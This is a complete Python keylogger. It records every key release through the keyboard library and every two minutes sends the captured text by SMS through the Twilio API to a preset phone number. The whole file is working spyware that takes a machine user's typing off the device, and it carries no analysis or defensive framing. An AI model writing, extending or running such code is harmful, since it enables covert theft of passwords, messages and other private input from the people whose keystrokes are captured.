from constants import *
from twilio.rest import Client
import keyboard
from threading import Timer

# Delay between sending keylogged information in seconds
REPORT_DELAY = 120
# The Twilio client
client = Client(account_sid, auth_token)

class Logger:
    """
    Represents the data logger (keystrokes, locational data)
    """

    def __init__(self, delay):
        # Initialize the logger with a message delay
        self.delay = delay
        self.logged = " "

    def callback(self, event):
        name = event.name
        # Handle special keys (not chars)
        if len(name) > 1:
            if name == "backspace" or name == "shift" or name == "caps lock":
                name = ""
            elif name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
        # Parse logged data into the variable
        self.logged += name

    # Method for reporting keylogged data to the user via SMS (twilio)
    def report(self):
        if self.logged:
            # If log isn't null we create an SMS containing the log to be sent to the user
            message = client.messages.create(
                to=USER_NUMBER,
                from_=TWILIO_NUMBER,
                body="\n\nLogged Text since last update: " + self.logged)
        print("Polled message to user.")
        # Reset values to default
        self.logged = " "
        timer = Timer(interval=self.delay, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    logger = Logger(delay=REPORT_DELAY)
    logger.start()
